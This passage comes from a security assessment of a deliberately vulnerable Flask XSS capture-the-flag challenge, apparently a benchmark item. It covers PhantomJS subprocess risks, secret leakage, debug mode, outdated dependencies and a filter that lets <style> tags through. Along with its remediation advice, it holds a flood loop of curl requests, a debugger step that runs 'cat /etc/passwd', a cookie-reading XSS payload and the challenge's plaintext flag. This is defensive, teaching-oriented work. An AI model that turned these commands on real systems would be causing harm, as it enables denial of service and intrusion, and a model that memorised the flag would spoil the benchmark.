The following inputs have **ZERO validation:**
- User input length (no max length enforcement)
- User input charset (no whitelist validation)
- HTTP headers
- Request methods (Flask defaults to GET only)

---

### Background Processing

**PhantomJS Subprocess Execution:**

**Purpose:** Validate XSS payloads by rendering user-controlled HTML and detecting `alert()`, `confirm()`, or `prompt()` calls

**Trigger:** Every request to `/page` endpoint (synchronous execution)

**Code:**
```python
# app.py:34
proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                       stdout=subprocess.PIPE, stdin=subprocess.PIPE)
```

**Security Analysis:**

1. **Command Injection Protection:** ✅ **SAFE**
   - Uses list arguments (not shell string)
   - All arguments are hardcoded
   - User input does not flow into command

2. **Resource Exhaustion:** 🔴 **VULNERABLE**
   - No rate limiting on subprocess spawning
   - Each request spawns new PhantomJS instance
   - 5-second timeout per process
   - Attacker can spawn unlimited processes via rapid requests

   **DoS Attack Scenario:**
   ```bash
   # Spawn 100 PhantomJS processes simultaneously
   for i in {1..100}; do
       curl "http://target:5000/page?name=test" &
   done
   ```

3. **Timeout Enforcement:** ✅ **IMPLEMENTED**
   - Uses `timeout` command to limit execution to 5 seconds
   - Prevents infinite execution

4. **Privilege Model:** 🔴 **INSECURE**
   - PhantomJS runs as same user as Flask app
   - Container runs as root (no USER directive in Dockerfile)
   - No sandboxing or privilege dropping

**PhantomJS Script** (`check.js:1-48`):

```javascript
var system = require('system');
var page = require('webpage').create();
var input = system.stdin.readLine();

page.onAlert = function(msg) {
  console.log(msg);
};
page.onConfirm = function(msg) {
  console.log(msg);
};
page.onPrompt = function(msg) {
  console.log(msg);
};
setTimeout(function(){
    if(page.custom == true) {
        console.log("XSS");
    }
    phantom.exit(0);
}, 1000);
page.open(input, function(status) {
    // Page rendering
});
```

**Security Implications:**

- PhantomJS loads user-controlled HTML from localhost URL
- Browser APIs (`alert`, `confirm`, `prompt`) are hooked to detect XSS
- If any dialog is triggered within 1 second, `page.custom` is set and "XSS" is outputted
- This triggers flag disclosure in Python code

**Attack Surface for PhantomJS Exploitation:**

| Attack Type | Description | Feasibility |
|-------------|-------------|-------------|
| **PhantomJS CVEs** | Exploit known vulnerabilities in abandoned PhantomJS project | 🔴 HIGH |
| **SSRF via PhantomJS** | Not possible - URL is hardcoded to localhost | 🟢 NONE |
| **Resource exhaustion** | Spawn many instances to consume CPU/memory | 🔴 HIGH |
| **Escape sandbox** | Break out of PhantomJS to host system | 🟡 MEDIUM |

---

### Attack Surface Summary Table

| Entry Point | Authentication | Input Validation | Output Encoding | Rate Limiting | Risk Level |
|-------------|----------------|------------------|-----------------|---------------|------------|
| `GET /` | ❌ None | N/A | N/A | ❌ None | 🟢 LOW |
| `GET /page` | ❌ None | 🟡 Weak blacklist | ❌ None | ❌ None | 🔴 CRITICAL |
| `GET /static/*` | ❌ None | ✅ Path traversal protected | N/A | ❌ None | 🟢 LOW |
| PhantomJS subprocess | N/A | ❌ None | ✅ Escaped output | ❌ None | 🔴 HIGH |

---

## 6. Infrastructure & Operational Security

### Secrets Management: **CRITICAL FAILURES**

The application exhibits multiple severe secret management failures across the entire software development and deployment lifecycle.

#### Secret Inventory

**Secret #1: CTF Challenge Flag**

**Secret Type:** Challenge flag (intended to be protected)  
**Secret Value:** `flag{fcec3afc-4b74-433f-b638-14091e51092e}`

**Storage Locations and Security Analysis:**

**1. Version Control Storage** - 🔴 **CRITICAL SEVERITY**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/.env`  
**Line:** 1  
**Content:**
```bash
FLAG="flag{fcec3afc-4b74-433f-b638-14091e51092e}"
```

**Security Issues:**
- ❌ Secret committed to Git repository in plaintext
- ❌ Visible in Git history (permanent exposure even if file is later deleted)
- ❌ Accessible to anyone with repository access
- ❌ Leaked if repository is accidentally made public
- ❌ No `.gitignore` entry to prevent commit

**Attack Scenario:** Attacker with read access to Git repository (e.g., GitHub, GitLab, Bitbucket) can retrieve flag without solving challenge or accessing running application.

**Recommended Remediation:**
```bash
# Remove secret from Git history
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all

# Add to .gitignore
echo ".env" >> .gitignore

# Use environment variables at runtime instead
# docker run -e FLAG="$(cat /secure/flag.txt)" ...
```

**2. Docker Build Arguments** - 🔴 **HIGH SEVERITY**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/docker-compose.yml`  
**Lines:** 6-8
```yaml
build:
  context: ./src
  args:
    - FLAG=${FLAG}
```

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/Dockerfile`  
**Lines:** 23-25
```dockerfile
ARG FLAG
RUN sed -i s/@FLAG@/$FLAG/g secret.txt
```

**Security Issues:**
- ❌ Build arguments persist in Docker image history
- ❌ Flag visible via `docker history <image>`
- ❌ Flag baked into image layers (not runtime secret)
- ❌ Anyone with access to image can extract flag

**Proof of Exposure:**
```bash
$ docker history xben-015-24:latest
IMAGE          CREATED        CREATED BY                                      SIZE
<hash>         2 mins ago     ARG FLAG=flag{fcec3afc-4b74-433f-b638-14091e51092e}
<hash>         2 mins ago     RUN sed -i s/@FLAG@/$FLAG/g secret.txt
```

**Recommended Remediation:**
```dockerfile
# DO NOT use ARG for secrets
# Use runtime environment variables or Docker secrets instead

# Option 1: Runtime environment variable (docker run)
# docker run -e FLAG="${FLAG}" xben-015-24

# Option 2: Docker secrets (Swarm mode)
# docker secret create flag_secret /path/to/flag.txt
# In Dockerfile: RUN --mount=type=secret,id=flag_secret cat /run/secrets/flag_secret > secret.txt

# Option 3: Kubernetes secrets
# kubectl create secret generic flag-secret --from-literal=FLAG='flag{...}'
```

**3. Filesystem Storage** - 🔴 **HIGH SEVERITY**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/secret.txt`  
**Content (pre-build):** `@FLAG@` (template)  
**Content (runtime):** `flag{fcec3afc-4b74-433f-b638-14091e51092e}` (plaintext)

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:22`
```python
flags = open('secret.txt').read().split()
```

**Security Issues:**
- ❌ Secret stored in plaintext file
- ❌ No file permissions set (readable by all container users)
- ❌ No encryption at rest
- ❌ Loaded into application memory without protection

**Recommended Remediation:**
```python
import os

# Read from environment variable instead of file
flag = os.environ.get('FLAG')
if not flag:
    raise ValueError("FLAG environment variable not set")

# Or use encrypted storage with key from environment
from cryptography.fernet import Fernet
key = os.environ.get('ENCRYPTION_KEY')
cipher = Fernet(key)
encrypted_flag = open('secret.txt.enc', 'rb').read()
flag = cipher.decrypt(encrypted_flag).decode()
```

**Secret #2: Flask Secret Key**

**Status:** ❌ **NOT SET** - 🔴 **HIGH SEVERITY**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:24-25`
```python
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
# No app.secret_key configured!
```

**Security Issues:**
- ❌ Flask secret key not configured
- ❌ Session cookies would be unsigned (if sessions were used)
- ❌ No CSRF token generation possible
- ❌ No secure cookie signing

**Impact:** While sessions are not currently used, any future addition of session-based authentication would be insecure.

**Recommended Remediation:**
```python
import os

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY')
if not app.secret_key:
    raise ValueError("FLASK_SECRET_KEY environment variable must be set")
```

#### Secret Rotation

**Status:** ❌ **NOT IMPLEMENTED**

- No secret rotation mechanism exists
- Flag is static (same value across all deployments)
- No automated secret updates
- No key versioning

**Recommended Implementation:**
- Implement periodic flag rotation (e.g., daily for CTF challenges)
- Use secret management service (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)
- Version secrets and track rotation history

#### Secret Access Controls

**Status:** ❌ **NOT IMPLEMENTED**

- No access control on `secret.txt` file (any container user can read)
- No principle of least privilege
- Application runs as root (unnecessary privileges)
- No secret auditing or logging

---

### Configuration Security

#### Environment Separation

**Environments Detected:** Single environment (no dev/staging/prod separation)

**Configuration Files:**
- `.env` - Contains production secret (insecure)
- `docker-compose.yml` - Single deployment configuration
- `Dockerfile` - No multi-stage builds for environment separation

**Security Issues:**
- ❌ No environment-specific configurations
- ❌ Development and production use same Dockerfile
- ❌ No separate secret management per environment
- ❌ Debug mode enabled (inappropriate for production)

**Recommended Remediation:**
```yaml
# docker-compose.dev.yml
services:
  web:
    environment:
      - FLASK_ENV=development
      - FLASK_DEBUG=1

# docker-compose.prod.yml
services:
  web:
    environment:
      - FLASK_ENV=production
      - FLASK_DEBUG=0
    secrets:
      - flag_secret
```

#### Secret Handling in Configuration

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:76`
```python
app.run(debug=True)  # 🔴 CRITICAL: Debug mode enabled
```

**Debug Mode Security Implications:**
- ✅ **Werkzeug Debugger Enabled:** Interactive debugger accessible at error pages
- ✅ **Remote Code Execution:** Debugger allows arbitrary Python execution
- ✅ **Stack Traces Exposed:** Full application internals visible in error messages
- ✅ **Auto-Reload Enabled:** Code changes automatically reload (DoS risk)

**Attack Scenario:**
1. Trigger application error (e.g., `GET /page?name=<invalid>`)
2. Access Werkzeug debugger interface
3. Execute arbitrary Python code:
   ```python
   import os
   os.system('cat /etc/passwd')
   ```

**Recommended Remediation:**
```python
import os

debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
app.run(debug=debug_mode, host='0.0.0.0', port=5000)
```

#### Infrastructure Security Headers Configuration

**Search Results:** ❌ **NONE FOUND**

No infrastructure-level security headers are configured in:
- Nginx configuration (no reverse proxy detected)
- Kubernetes Ingress (no K8s manifests found)
- CDN settings (no CDN integration)
- Load balancer configuration (not applicable)

**Application-Level Headers:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (ENTIRE FILE SEARCHED)

**Finding:** ❌ No `@app.after_request` decorator exists to set response headers

**Missing Security Headers:**

| Header | Purpose | Risk of Absence |
|--------|---------|-----------------|
| `Strict-Transport-Security` (HSTS) | Force HTTPS | 🔴 HIGH - No TLS enforcement |
| `Content-Security-Policy` | Prevent XSS | 🔴 CRITICAL - XSS possible |
| `X-Frame-Options` | Prevent clickjacking | 🟡 MEDIUM - Framing allowed |
| `X-Content-Type-Options` | Prevent MIME sniffing | 🟡 MEDIUM - Type confusion |
| `Referrer-Policy` | Control referrer leakage | 🟢 LOW - Limited sensitive data |
| `Permissions-Policy` | Restrict browser features | 🟢 LOW - Minimal feature use |

**Cache-Control Header Search:**

**Finding:** ❌ No `Cache-Control` headers configured

**Risk:** Sensitive responses (including flag disclosure) may be cached by:
- Browser cache
- Proxy servers
- CDN (if present)

**Recommended Remediation:**
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    # Note: HSTS should only be set when using HTTPS
    # response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

---

### External Dependencies

**Dependency Manifest:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/requirements.txt`

```
Flask==1.1.4
phantomjs
```

**Dependency Analysis:**

#### Flask 1.1.4

**Current Version:** 1.1.4 (released ~March 2020)  
**Latest Version:** 3.0.x (as of 2024)  
**Age:** Approximately 4 years outdated

**Known Vulnerabilities:**
- **CVE-2023-30861:** Flask CORS bypass (affects Flask-CORS extension, not core)
- Missing security improvements from Flask 2.x and 3.x releases

**Security Implications:**
- Lacks modern security features (improved session handling, better CORS)
- Missing performance and stability fixes
- No longer receives security patches in 1.x branch

**Recommended Action:**
```
# requirements.txt
Flask==3.0.0  # Latest stable version
Werkzeug==3.0.1  # Flask dependency with security fixes
```

#### PhantomJS

**Current Status:** ❌ **ABANDONED PROJECT** - 🔴 **CRITICAL RISK**

**Last Release:** PhantomJS 2.1.1 (January 2016)  
**Project Status:** Officially abandoned in March 2018  
**Maintainer Statement:** "I think people will start using headless Chrome more."

**Known Vulnerabilities:**
- **CVE-2019-17221:** XSS vulnerability in PhantomJS
- **CVE-2018-1000136:** Arbitrary file read vulnerability
- Multiple unpatched WebKit engine vulnerabilities (hundreds of CVEs)
- SSL/TLS verification bypasses
- Remote code execution vectors

**Security Implications:**
- **CRITICAL:** Zero security updates for 6+ years
- **HIGH:** Based on outdated QtWebKit engine with known exploits
- **HIGH:** Subprocess execution creates attack surface
- **MEDIUM:** Potential container escape via PhantomJS exploits

**Recommended Action:**
```python
# Replace PhantomJS with modern headless browser
# Option 1: Playwright (recommended)
from playwright.sync_api import sync_playwright

def check_solution(page_content, flag):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.on("dialog", lambda dialog: dialog.accept())
        page.set_content(page_content)
        # Check if dialogs were triggered
        browser.close()

# Option 2: Selenium with headless Chrome/Firefox
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument('--headless')
driver = webdriver.Chrome(options=options)
```

#### Python Standard Library (Python 2.7.18)

**Status:** 🔴 **END-OF-LIFE** - No security updates since January 1, 2020

**Known Vulnerability Classes:**
- Unicode handling bugs
- Pickle deserialization RCE (CVE-2019-20907, unpatched in 2.7)
- SSL/TLS weaknesses (outdated cipher suites)
- XML parsing vulnerabilities (CVE-2020-8492, no backport)

---

### Monitoring & Logging

#### Security Event Visibility

**Logging Implementation:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:15-17`
```python
import logging
logging.basicConfig(level=logging.INFO)
```

**Analysis:**
- ✅ Logging module imported and configured
- ❌ Logger is configured but **NEVER USED**
- ❌ Application uses `print` statements instead of structured logging

**Debug Output Analysis:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:41-47`
```python
print "Page:"
print page      # Contains user XSS payload
print "Resultado:"
print result    # Contains PhantomJS execution result
```

**Security Event Coverage:**

| Event Type | Logged? | Severity | File |
|------------|---------|----------|------|
| Authentication attempts | ❌ N/A (no auth) | N/A | N/A |
| Authorization failures | ❌ N/A (no authz) | N/A | N/A |
| Input validation failures | ❌ No | 🟡 MEDIUM | app.py:66-67 |
| XSS attempts | ✅ Yes (via print) | 🔴 HIGH | app.py:42 |
| Successful XSS | ✅ Yes (implicit) | 🔴 CRITICAL | app.py:56 |
| Flag disclosure | ❌ No | 🔴 CRITICAL | app.py:56 |
| Exception errors | ✅ Yes (propagated) | 🟡 MEDIUM | app.py:25 |
| PhantomJS subprocess spawn | ❌ No | 🟡 MEDIUM | app.py:34 |
| Temporary file creation | ❌ No | 🟢 LOW | app.py:38 |

**Log Sanitization:**

**Status:** ❌ **NOT IMPLEMENTED**

User payloads are logged without sanitization:
```python
print page  # May contain: <script>alert(document.cookie)</script>
```

**Risks:**
- Log injection attacks (if logs are viewed in web interface)
- Command injection (if logs are processed by shell scripts)
- PII exposure in logs
- Attack pattern visibility

**Recommended Remediation:**
```python
import logging
import re

logger = logging.getLogger(__name__)

def sanitize_log(data):
    """Remove sensitive and dangerous characters from logs"""
    # Remove control characters
    data = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', data)
    # Truncate long payloads
    if len(data) > 200:
        data = data[:200] + '...[truncated]'
    return data

# Usage
logger.info(f"User input: {sanitize_log(msg)}")
```

**Log Retention and Rotation:**

**Status:** ❌ **NOT CONFIGURED**

- No log rotation mechanism
- No log retention policy
- Logs accumulate indefinitely in container stdout
- No centralized log aggregation

**Recommended Implementation:**
```python
from logging.handlers import RotatingFileHandler

handler = RotatingFileHandler(
    'app.log',
    maxBytes=10_000_000,  # 10MB
    backupCount=5
)
handler.setLevel(logging.INFO)
logger.addHandler(handler)
```

**Audit Logging:**

**Status:** ❌ **NOT IMPLEMENTED**

No audit trail for:
- Challenge attempts
- Successful challenge completions
- Flag disclosures
- Administrative actions (none exist)
- Configuration changes

**Recommended Audit Events:**
```python
logger.info("Challenge attempt", extra={
    'event_type': 'challenge_attempt',
    'user_ip': request.remote_addr,
    'payload_hash': hashlib.sha256(msg.encode()).hexdigest(),
    'timestamp': datetime.utcnow().isoformat()
})

logger.warning("Flag disclosed", extra={
    'event_type': 'flag_disclosure',
    'user_ip': request.remote_addr,
    'challenge': 'level_3',
    'timestamp': datetime.utcnow().isoformat()
})
```

**Security Monitoring:**

**Status:** ❌ **NOT IMPLEMENTED**

Missing security monitoring capabilities:
- No intrusion detection
- No anomaly detection (e.g., rapid request patterns)
- No alerting system
- No SIEM integration
- No metrics collection (Prometheus, Grafana)

---

## 7. Overall Codebase Indexing

The XBEN-015-24 codebase is a **compact, monolithic Python Flask application** designed as a Capture-The-Flag (CTF) security challenge focused on XSS exploitation. The codebase organization reflects its single-purpose nature, with minimal architectural complexity and no formal separation of concerns beyond basic file organization.

**Root Directory Structure:**

```
XBEN-015-24/
├── .env                    # 🔴 CRITICAL: Plaintext secrets in version control
├── benchmark.json          # CTF challenge metadata
├── docker-compose.yml      # Container orchestration configuration
└── src/                    # Application source code directory
    ├── Dockerfile          # Container image definition (Python 2.7.18-slim base)
    ├── requirements.txt    # Python dependencies (Flask==1.1.4, phantomjs)
    ├── app.py             # 🔑 MAIN APPLICATION (77 lines) - Flask routes and logic
    ├── constants.py        # 🔑 HTML TEMPLATES (203 lines) - Static page content
    ├── check.js           # 🔑 XSS VALIDATOR (48 lines) - PhantomJS detection script
    ├── secret.txt         # 🔴 Flag storage (plaintext, @FLAG@ template)
    └── static/            # Public web assets directory
        ├── css/           # Stylesheets
        │   ├── style.css  # Main stylesheet
        │   ├── templates/ # Template-specific CSS (9 files)
        │   └── fonts/     # Web fonts (4 files: .woff, .woff2, .otf, .eot)
        ├── img/           # Images directory
        │   ├── *.png      # Challenge graphics (13 PNG files)
        │   └── cookies/   # Cookie-themed images subdirectory
        └── assets/        # Additional assets
            └── fav-icon.png  # Favicon
```

**Codebase Metrics:**
- **Total Lines of Code:** ~330 lines (Python: 280, JavaScript: 48)
- **Total Files:** 35 (3 source code, 32 static assets)
- **Primary Language:** Python 2.7.18 (CRITICAL: End-of-Life)
- **Framework:** Flask 1.1.4 (outdated)
- **External Process:** PhantomJS (abandoned project)

**Architectural Organization:**

The codebase follows a **minimalist structure** with no formal MVC separation, dependency injection, or layered architecture. All application logic resides in a single `app.py` file containing:

1. **Initialization Block** (Lines 1-27): Imports, encoding configuration, Flask app setup, flag loading
2. **Core Logic Function** (Lines 33-51): `check_solution()` - PhantomJS subprocess orchestration
3. **Route Handlers** (Lines 29-31, 63-72): Two HTTP endpoints (`/` and `/page`)
4. **Application Entry Point** (Line 76): Flask development server launch with debug mode

**Key Architectural Patterns:**

**1. Template-as-Constants Pattern:**  
All HTML content is stored as Python string constants in `constants.py` rather than using Flask's Jinja2 template engine. This anti-pattern has critical security implications:
- ❌ No automatic output escaping (Jinja2's `{{ variable }}` auto-escapes by default)
- ❌ String concatenation enables XSS vulnerabilities
- ❌ No template inheritance or composition
- ✅ Simplicity for single-purpose CTF challenge

**Example:**
```python
# constants.py:78-100 - TEMPLATE_CONTENT_TAG
TEMPLATE_CONTENT_TAG = '''
<!DOCTYPE html>
<html>
<body>
    <form class="box-form">
        <input type=text name=name placeholder="Enter your name...">
        {2}  <!-- USER INPUT INSERTED HERE WITHOUT ESCAPING -->
    </form>
    {3}  <!-- RESULT MESSAGE INSERTED HERE -->
</body>
</html>
'''.format(...)
```

**2. Subprocess-Based Validation:**  
The application uses an external PhantomJS process for XSS detection rather than in-process validation. This creates a trust boundary between Flask (Python) and PhantomJS (JavaScript):

```
User Input → Flask (Python) → Temp File → PhantomJS (JavaScript) → stdout → Flask
```

**Security Impact:** Process isolation provides some defense-in-depth, but PhantomJS vulnerabilities could enable container escape.

**3. Temporary File Race Condition Pattern:**  
The application creates temporary HTML files in the web-accessible `static/` directory:

```python
fn = "static/" + os.urandom(16).encode('hex') + '.html'  # Random filename
of.write(page)  # Write user payload
# FILE EXISTS AND IS PUBLICLY ACCESSIBLE HERE
proc.stdin.write(url)  # PhantomJS fetches via HTTP
# RACE CONDITION WINDOW
os.unlink(fn)  # Delete file
```

**Security Impact:** If an attacker can guess the random filename during the window between creation and deletion, they can access the file directly via `/static/[filename].html`.

**Code Organization Philosophy:**

The codebase prioritizes **simplicity and minimalism** over security best practices:
- ✅ **Easy to understand:** Single file contains all logic
- ✅ **Fast development:** No boilerplate or framework overhead
- ❌ **No separation of concerns:** Routes, business logic, and data access mixed
- ❌ **No testability:** No dependency injection or mocking support
- ❌ **No reusability:** Hardcoded values, no configuration abstraction

**Static Asset Management:**

The `static/` directory follows a conventional structure for web assets:

```
static/
├── css/style.css           # Main application styles (348 lines)
├── css/templates/*.css     # Page-specific themes (9 variants)
├── css/fonts/*             # Typography assets
├── img/*.png              # Visual elements (cookies, stars, challenges)
└── assets/fav-icon.png    # Browser icon
```

**Discovery Impact:** All static files are publicly accessible via `/static/<path>`, creating potential information disclosure if sensitive files are mistakenly placed in this directory.

**Build and Deployment Tooling:**

**Docker Multi-Stage Build:** ❌ Not used  
**Dependency Locking:** ❌ No `requirements.lock` or version pinning  
**Configuration Management:** ❌ Hardcoded values, no abstraction  
**Environment Variables:** 🟡 Partial (FLAG in .env, but hardcoded debug=True)

**Dockerfile Analysis:**
```dockerfile
FROM python:2.7.18-slim  # 🔴 CRITICAL: EOL base image
RUN apt-get update && apt-get install -y phantomjs  # 🔴 Abandoned software
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
ARG FLAG  # 🔴 Secret in build argument (persists in image history)
RUN sed -i s/@FLAG@/$FLAG/g secret.txt  # 🔴 Bakes secret into image
EXPOSE 5000
CMD ["python", "app.py"]  # Runs with debug=True
```

**Testing Infrastructure:**

**Status:** ❌ **COMPLETELY ABSENT**

No testing framework, test files, or test infrastructure exists:
- No `tests/` directory
- No `pytest`, `unittest`, or test dependencies
- No CI/CD pipeline configuration
- No code coverage tooling

**Security Testing:** The application is intended to be *attacked* rather than *tested*, consistent with its CTF challenge purpose.

**Code Generation and Conventions:**

**Code Style:** Python 2 legacy style (no type hints, print statements, manual encoding)  
**Naming Conventions:** snake_case for functions/variables, UPPER_CASE for constants  
**Documentation:** ❌ No docstrings, no inline comments  
**Linting:** ❌ No pylint, flake8, or black configuration

**Example of Python 2 Legacy Code:**
```python
# app.py:5-6
reload(sys)  # Python 2 only (removed in Python 3)
sys.setdefaultencoding('utf8')  # Dangerous encoding manipulation
```

**Discoverability of Security Components:**

The minimalist structure aids security analysis:
- ✅ **All routes in single file:** Easy to enumerate attack surface (lines 29-31, 63-72 of app.py)
- ✅ **No hidden functionality:** No complex routing, blueprints, or dynamic imports
- ✅ **Transparent data flow:** User input → blacklist filter → template → response (all in ~10 lines)
- ❌ **No security middleware:** Must manually inspect each route for protection

**Significant Tools and Conventions:**

1. **PhantomJS Integration:** External process for XSS detection (check.js communicates via stdin/stdout)
2. **Environment Variable Injection:** .env file → docker-compose.yml → Dockerfile ARG → sed substitution
3. **String Formatting Templates:** Python `.format()` instead of Jinja2 (security risk)
4. **Debug Print Statements:** Extensive use of `print` for debugging (lines 41-47)

**Codebase Health Assessment:**

| Aspect | Status | Impact on Security Analysis |
|--------|--------|----------------------------|
| **Code Complexity** | 🟢 Low (single file, 77 lines) | ✅ Easy to audit completely |
| **Technology Currency** | 🔴 Critical (Python 2.7 EOL, Flask 1.1.4 outdated) | ❌ Multiple unpatched vulnerabilities |
| **Documentation** | 🔴 None | 🟡 Requires code reading for understanding |
| **Testing** | 🔴 None | ❌ No test coverage for security controls |
| **Dependency Management** | 🔴 Poor (2 deps, both outdated/abandoned) | ❌ Supply chain risk |
| **Secret Management** | 🔴 Critical failures | ❌ Flag exposed in Git, Docker, filesystem |

**Overall Impact on Penetration Testing:**

The codebase's simplicity is a **double-edged sword** for security assessment:

**Advantages:**
- Complete attack surface enumerable in minutes (2 routes, 1 form input)
- No hidden complexity or obfuscated logic
- Easy to trace data flow from input to output
- No authentication/authorization complexity to bypass

**Disadvantages:**
- Outdated technology stack requires vulnerability research
- PhantomJS attack surface requires specialized knowledge
- No security controls to analyze (everything is missing)
- Python 2 quirks may introduce unexpected behavior

**Conclusion:**

This codebase represents a **deliberately vulnerable educational application** with intentional security weaknesses for CTF training. However, several issues—particularly secret management in version control, debug mode configuration, and use of end-of-life software—represent **real security risks** even in a challenge context. The minimal architecture aids rapid security analysis but provides zero defense-in-depth against exploitation.

---

## 8. Critical File Paths

All file paths referenced in this security analysis, categorized by security domain:

### Configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/.env` - Environment variables (🔴 contains FLAG in plaintext)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/docker-compose.yml` - Container orchestration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/Dockerfile` - Container image definition
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/requirements.txt` - Python dependencies
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/benchmark.json` - CTF challenge metadata

### Authentication & Authorization
- ❌ **NONE** - No authentication or authorization code exists

### API & Routing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` - Main Flask application with all routes (lines 29-31: `/` route, lines 63-72: `/page` route)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/constants.py` - HTML template constants

### Data Models & DB Interaction
- ❌ **NONE** - No database, ORM, or data models exist

### Dependency Manifests
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/requirements.txt` - Python package dependencies

### Sensitive Data & Secrets Handling
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/.env` - FLAG secret in plaintext (🔴 CRITICAL)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/secret.txt` - Flag storage file (template with @FLAG@ placeholder, replaced at build time)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (line 22) - Flag loading code
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (line 56) - Flag disclosure code

### Middleware & Input Validation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (lines 66-67) - Blacklist-based XSS filter (allows `<style>` tags)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (line 58) - Output escaping with `cgi.escape()` (partial protection)

### Logging & Monitoring
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (lines 15-17) - Logging configuration (unused)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (lines 41-47) - Debug print statements (exposes user payloads)

### Infrastructure & Deployment
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/docker-compose.yml` - Docker Compose orchestration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/Dockerfile` - Docker image build instructions
- ❌ **NO** `nginx.conf` - No reverse proxy configuration
- ❌ **NO** Kubernetes manifests - No K8s deployment
- ❌ **NO** `gateway-ingress.yaml` - No ingress controller

### XSS Vulnerability Files
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (lines 65-72) - Primary XSS sink in `/page` route
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/constants.py` (lines 78-100) - `TEMPLATE_CONTENT_TAG` with unsafe string interpolation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/check.js` - PhantomJS XSS detection script

### PhantomJS Integration (Attack Surface)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py` (lines 33-51) - `check_solution()` function with subprocess execution
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/check.js` - PhantomJS script for XSS validation

### Static Assets (Publicly Accessible)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/css/style.css` - Main stylesheet
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/css/templates/*.css` - Template-specific styles (9 files)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/img/*.png` - Images (13 files)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/css/fonts/*` - Web fonts (4 files)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/assets/fav-icon.png` - Favicon
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/[random].html` - Dynamically created temporary files (race condition risk)

---

## 9. XSS Sinks and Render Contexts

This section catalogs all Cross-Site Scripting (XSS) sinks discovered in **network-accessible components only**. Out-of-scope items (CLI tools, build scripts, local-only utilities) are excluded per the Master Scope Definition.

### XSS Sink #1: HTML Body Context - Direct User Input Injection

**Sink Type:** HTML Body Context (Direct HTML Injection)  
**Network Accessibility:** ✅ Public (GET /page endpoint)  
**Exploitability:** 🔴 **CRITICAL**

**Location:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py`  
**Lines:** 65-72

**Code:**
```python
@app.route('/page')
def page_handler():
    msg = request.args.get('name','')  # Line 65: User input from GET parameter
    blacklist = r'<(?!style\b)[^>]+>'  # Line 66: Blacklist regex
    msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)  # Line 67: Filter
